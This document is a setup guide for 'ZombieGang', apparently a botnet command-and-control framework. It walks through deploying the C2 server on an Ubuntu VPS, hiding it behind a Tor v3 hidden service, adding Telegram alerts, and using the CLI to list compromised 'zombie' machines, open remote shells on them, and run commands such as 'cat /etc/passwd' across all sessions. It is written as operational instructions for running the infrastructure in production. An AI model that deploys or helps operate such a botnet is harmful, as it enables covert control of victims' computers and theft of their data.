# ZombieGang CLI Setup for Ubuntu VPS

## Overview
This guide covers setting up the ZombieGang CLI-only version on Ubuntu VPS with Telegram notifications and Tor v3 hidden service support.

## Requirements

### System Requirements
- Ubuntu 18.04 LTS or newer
- Python 3.8 or higher
- Root or sudo access
- At least 1GB RAM
- 10GB free disk space

### Software Requirements
- MariaDB/MySQL server
- PHP 7.4 or higher
- Tor (for hidden service support)
- Python 3 and pip3

## Installation Steps

### 1. Update System
```bash
sudo apt-get update
sudo apt-get upgrade -y
```

### 2. Install Required Packages
```bash
# Install Python and dependencies
sudo apt-get install -y python3 python3-pip python3-venv

# Install MariaDB
sudo apt-get install -y mariadb-server mariadb-client

# Install PHP
sudo apt-get install -y php php-mysql php-cli

# Install Tor for v3 hidden services
sudo apt-get install -y tor
```

### 3. Configure MariaDB
```bash
# Secure MariaDB installation
sudo mysql_secure_installation

# Create database
cd zombiegang/cc-server
# Edit init.sql to set your password
nano api/config/data/init.sql
# Initialize database
sudo ./initdb
```

### 4. Create Master Profile
```bash
# Login to MariaDB
mariadb -u zgang -p

# Create master user
USE zgang;
INSERT INTO Masters SET username = 'your-username', public_key = '';
EXIT;
```

### 5. Configure CC Server
```bash
cd cc-server

# Configure database connection
nano api/config/database.php
# Set $host, $password, $db_name, $db_user

# Configure JWT secret key
nano api/config/core.php
# Set a random $key value

# Start PHP server (for testing)
sudo php -S 0.0.0.0:8080
```

### 6. Configure Tor Hidden Service (Optional but Recommended)

#### Edit Tor Configuration
```bash
sudo nano /etc/tor/torrc
```

Add the following lines:
```
# Hidden Service Configuration for ZombieGang
HiddenServiceDir /var/lib/tor/zombiegang/
HiddenServiceVersion 3
HiddenServicePort 80 127.0.0.1:8080
```

#### Restart Tor and Get Onion Address
```bash
sudo systemctl restart tor
sudo cat /var/lib/tor/zombiegang/hostname
```

Save the `.onion` address for later use.

### 7. Setup Telegram Bot

#### Create Bot
1. Open Telegram and search for `@BotFather`
2. Send `/newbot` command
3. Follow instructions to create your bot
4. Save the bot token

#### Get Chat ID
1. Search for `@userinfobot` on Telegram
2. Start a chat with it
3. It will send you your chat ID
4. Save the chat ID

### 8. Install Master Client (CLI)
```bash
cd master-client

# Install Python dependencies
pip3 install -r requirements.txt

# Or using virtual environment (recommended)
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

### 9. Configure Master Client

#### Set Environment Variables
```bash
# Set Telegram credentials
export TELEGRAM_BOT_TOKEN='your-bot-token-here'
export TELEGRAM_CHAT_ID='your-chat-id-here'

# Set Tor proxy (if using Tor)
export TOR_SOCKS_HOST='127.0.0.1'
export TOR_SOCKS_PORT='9050'
```

Or create a `.env` file:
```bash
nano ~/.zombiegang_env
```

Add:
```
export TELEGRAM_BOT_TOKEN='your-bot-token-here'
export TELEGRAM_CHAT_ID='your-chat-id-here'
export TOR_SOCKS_HOST='127.0.0.1'
export TOR_SOCKS_PORT='9050'
```

Load it before running:
```bash
source ~/.zombiegang_env
```

#### Edit CLI Configuration (Optional)
```bash
nano cli.py
```

Comment out the test environment section (lines 24-30) for production:
```python
############################################
# testing enviroment (comment in prd env) ##
############################################
# zession.username = 'r3nt0n'               ##
# zession.password = 'password'             ##
# zession.remote_host = 'localhost:8080'    ##
############################################
```

### 10. Run the CLI
```bash
python3 cli.py
```

## CLI Usage

### Basic Commands

#### Set Variables
```
set USER your-username
set PSWD (will prompt for password)
set RHOST your-server:8080
```

For Tor hidden service:
```
set RHOST your-onion-address.onion
```

#### Configure Proxy (for Tor)
```
set PXHOST 127.0.0.1
set PXPORT 9050
proxy
```

#### Login
```
login
```

#### List Zombies
```
get zombies
get zombies id username ip
```

#### Start Remote Shell Session
```
start <zombie_id>
```

#### Execute Commands
Once in a session, just type commands:
```
whoami
ls -la
cat /etc/passwd
```

#### Stop Session
```
stop <zombie_id>
```

### Advanced Usage

#### Multiple Sessions
```
set SESSION all
<command>  # Will execute on all active sessions
```

#### Show Variables
```
show
show USER RHOST
```

## Telegram Notifications

When properly configured, you will receive Telegram notifications for:
- Master login events
- Zombie connections/disconnections
- Remote shell session start/stop
- Task completions with results
- Errors and warnings

## Tor v3 Hidden Service Features

### Benefits
- Complete anonymity for CC server
- No need for public IP or domain
- Automatic encryption
- 56-character onion address (v3)

### Connecting Through Tor
1. Start Tor service: `sudo systemctl start tor`
2. Enable proxy in CLI: `proxy`
3. Use `.onion` address for RHOST
4. All traffic will be routed through Tor

### Security Notes
- Use `socks5h://` protocol for DNS resolution through Tor
- Supports v3 onion services with longer addresses
- All connections are end-to-end encrypted

## Troubleshooting

### Telegram Not Working
- Verify bot token and chat ID are correct
- Check that `python-telegram-bot` is installed: `pip3 show python-telegram-bot`
- Check network connectivity
- Review logs for error messages

### Tor Connection Issues
- Ensure Tor is running: `sudo systemctl status tor`
- Check SOCKS port: `netstat -tlnp | grep 9050`
- Verify Tor configuration: `sudo cat /etc/tor/torrc`
- Check logs: `sudo journalctl -u tor`

### CC Server Connection Failed
- Verify CC server is running: `netstat -tlnp | grep 8080`
- Check firewall rules: `sudo ufw status`
- Verify database is running: `sudo systemctl status mariadb`
- Check PHP errors: `tail -f /var/log/apache2/error.log`

### Database Issues
- Verify credentials in `api/config/database.php`
- Test connection: `mariadb -u zgang -p`
- Check database exists: `SHOW DATABASES;`
- Review MariaDB logs: `sudo tail -f /var/log/mysql/error.log`

## Security Best Practices

1. **Use Tor Hidden Service** - Keeps your CC server anonymous
2. **Strong Passwords** - Use complex passwords for database and master accounts
3. **Firewall Configuration** - Only expose necessary ports
4. **Regular Updates** - Keep system and dependencies updated
5. **Secure Telegram** - Keep bot token secret, use 2FA on Telegram
6. **Log Monitoring** - Regularly review logs for suspicious activity
7. **Backup** - Regular database backups
8. **Encryption** - All communication through Tor is encrypted

## Production Deployment

### Systemd Service for CC Server
Create `/etc/systemd/system/zombiegang-cc.service`:
```ini
[Unit]
Description=ZombieGang CC Server
After=network.target mariadb.service

[Service]
Type=simple
User=www-data
WorkingDirectory=/path/to/zombiegang/cc-server
ExecStart=/usr/bin/php -S 127.0.0.1:8080
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

Enable and start:
```bash
sudo systemctl daemon-reload
sudo systemctl enable zombiegang-cc
sudo systemctl start zombiegang-cc
```

### Run CLI in Screen/Tmux
```bash
# Using screen
screen -S zombiegang
source ~/.zombiegang_env
python3 cli.py
# Ctrl+A, D to detach

# Using tmux
tmux new -s zombiegang
source ~/.zombiegang_env
python3 cli.py
# Ctrl+B, D to detach
```

## Version Information
- ZombieGang CLI v1.0.0
- Ubuntu VPS Edition
- Features: Telegram Integration, Tor v3 Support
- Date: 2025

## Support
For issues and contributions, visit: https://github.com/bitbybit91/zombiegang
